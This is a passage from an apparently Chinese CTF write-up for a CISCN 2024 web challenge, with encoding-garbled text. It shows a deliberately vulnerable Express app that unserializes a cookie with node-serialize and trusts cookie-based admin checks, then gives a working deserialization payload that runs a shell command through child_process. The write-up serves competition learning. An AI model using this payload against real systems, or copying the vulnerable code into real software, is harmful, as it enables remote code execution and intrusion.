punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// å®šæ—¶æ¸…é™¤</span><span class="token keyword">let</span> job1 <span class="token operator">=</span> schedule<span class="token punctuation">.</span><span class="token function">scheduleJob</span><span class="token punctuation">(</span>rule1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">'data.html'</span><span class="token punctuation">,</span><span class="token string">"#è·å–çš„æ•°æ®ä¿¡æ¯\n"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"wriet error"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-art-template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data_path <span class="token operator">=</span> <span class="token string">"data.html"</span><span class="token punctuation">;</span><span class="token comment">// Middleware to set default cookies for /admin route</span><span class="token keyword">function</span> <span class="token function">setDefaultAdminCookies</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'normal'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'is_admin'</span><span class="token punctuation">,</span> <span class="token string">'false'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//ä¸»é¡µ</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>fs<span class="token punctuation">.</span><span class="token function">appendFile</span><span class="token punctuation">(</span><span class="token string">'data.html'</span><span class="token punctuation">,</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åå°ç®¡ç†</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> setDefaultAdminCookies<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">datadir</span> <span class="token operator">:</span> data_path        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> setDefaultAdminCookies<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newname<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>data_path <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newname<span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å·²å¼ƒç”¨çš„ç™»å½•</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/login.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>profile<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>profile<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> obj <span class="token operator">=</span> serialize<span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">escape</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//QQ</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/qq'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> data_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>package.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"app"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"app.js"</span><span class="token punctuation">,</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"art-template"</span><span class="token operator">:</span> <span class="token string">"^4.13.2"</span><span class="token punctuation">,</span>    <span class="token property">"body-parser"</span><span class="token operator">:</span> <span class="token string">"^1.19.0"</span><span class="token punctuation">,</span>    <span class="token property">"chrome"</span><span class="token operator">:</span> <span class="token string">"0.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"cookie-parser"</span><span class="token operator">:</span> <span class="token string">"^1.4.5"</span><span class="token punctuation">,</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.1"</span><span class="token punctuation">,</span>    <span class="token property">"express-art-template"</span><span class="token operator">:</span> <span class="token string">"^1.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"express-jwt"</span><span class="token operator">:</span> <span class="token string">"^5.3.0"</span><span class="token punctuation">,</span>    <span class="token property">"jsonwebtoken"</span><span class="token operator">:</span> <span class="token string">"^7.4.3"</span><span class="token punctuation">,</span>    <span class="token property">"node-schedule"</span><span class="token operator">:</span> <span class="token string">"^2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"node-serialize"</span><span class="token operator">:</span> <span class="token string">"0.0.4"</span><span class="token punctuation">,</span>    <span class="token property">"serialize"</span><span class="token operator">:</span> <span class="token string">"^0.1.3"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"^0.11.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"ISC"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®¡è®¡ä»£ç ï¼Œå‘ç°å¯ä»¥ç›´æ¥åœ¨&#x2F;loginè·¯ç”±ä¼ cookieå‚æ•°profileæ‰“serializeä¾èµ–çš„ååºåˆ—åŒ–</p><p>ç›´æ¥æ‰“payloadï¼Œå› ä¸ºä¸å›æ˜¾ï¼Œæ‰€ä»¥å°è¯•å†™æ–‡ä»¶å¸¦å¤–</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token string-property property">"function"</span><span class="token operator">:</span><span class="token string">"_$$ND_FUNC$$_function()&#123;\r\n\t\trequire('child_process').exec('ls />/tmp/1.txt', function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;()"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623125255162.png" alt="image-20240623125255162"></p><p>ç„¶åå»å‰é¢ä»»æ„æ–‡ä»¶è¯»å–é‚£è¾¹è¯»å–&#x2F;tmp&#x2F;1.txtå³å¯</p><h2 id="FIXï¼ˆFailedï¼‰"><a href="#FIXï¼ˆFailedï¼‰" class="headerlink" title="FIXï¼ˆFailedï¼‰"></a>FIXï¼ˆFailedï¼‰</h2><p>æœ‰å¥½å‡ ä¸ªæ´ï¼ŒçŒœæµ‹æ˜¯å·®ä¸€ä¸ªxssçš„æ´ï¼Œä¸€ç›´ä¸ä¼šä¿®</p><p>æ®è¯´xssæ˜¯22å¹´çš„é»‘ç›¾æ¯çš„æ–¹æ³•ï¼š<a href="https://mp.weixin.qq.com/s/F9v9-8s2_mJhlEWRICzVvg">https://mp.weixin.qq.com/s/F9v9-8s2_mJhlEWRICzVvg</a></p><p>å¤ç°xsså‚è€ƒï¼š<a href="https://blog.mo60.cn/index.php/archives/487.html">https://blog.mo60.cn/index.php/archives/487.html</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> serialize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> schedule <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-schedule'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Change working directory to /srv</span>process<span class="token punctuation">.</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'/srv'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> rule1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">schedule<span class="token punctuation">.</span>RecurrenceRule</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>rule1<span class="token punctuation">.</span>minute <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// å®šæ—¶æ¸…é™¤</span><span class="token keyword">let</span> job1 <span class="token operator">=</span> schedule<span class="token punctuation">.</span><span class="token function">scheduleJob</span><span class="token punctuation">(</span>rule1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">'data.html'</span><span class="token punctuation">,</span><span class="token string">"#è·å–çš„æ•°æ®ä¿¡æ¯\n"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"wriet error"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-art-template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data_path <span class="token operator">=</span> <span class="token string">"data.html"</span><span class="token punctuation">;</span><span class="token comment">// Middleware to set default cookies for /admin route</span><span class="token keyword">function</span> <span class="token function">setDefaultAdminCookies</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'normal'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'is_admin'</span><span class="token punctuation">,</span> <span class="token string">'false'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//ä¸»é¡µ</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>bd<span class="token operator">=</span><span class="token function">str</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token 